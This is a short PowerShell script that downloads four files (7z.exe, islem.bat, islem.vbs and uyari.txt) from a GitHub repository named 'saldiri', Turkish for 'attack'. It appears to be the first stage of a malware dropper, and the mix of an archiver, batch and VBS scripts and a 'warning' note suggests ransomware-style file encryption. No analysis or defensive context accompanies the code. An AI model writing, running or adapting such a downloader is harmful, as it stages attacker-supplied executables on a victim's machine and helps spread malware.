$url3 = 'https://github.com/KadirShn/saldiri/raw/main/7z.exe'; $output3 = '7z.exe'; $start_time = Get-Date; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url3, $output3); Write-Output 'Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)';
$url = 'https://github.com/KadirShn/saldiri/raw/main/islem.bat'; $output = 'islem.bat'; $start_time = Get-Date; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); Write-Output 'Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)';
$url1 = 'https://github.com/KadirShn/saldiri/raw/main/islem.vbs'; $output1 = 'islem.vbs'; $start_time = Get-Date; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url1, $output1); Write-Output 'Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)';
$url2 = 'https://github.com/KadirShn/saldiri/raw/main/uyari.txt'; $output2 = 'uyari.txt'; $start_time = Get-Date; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url2, $output2); Write-Output 'Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)';
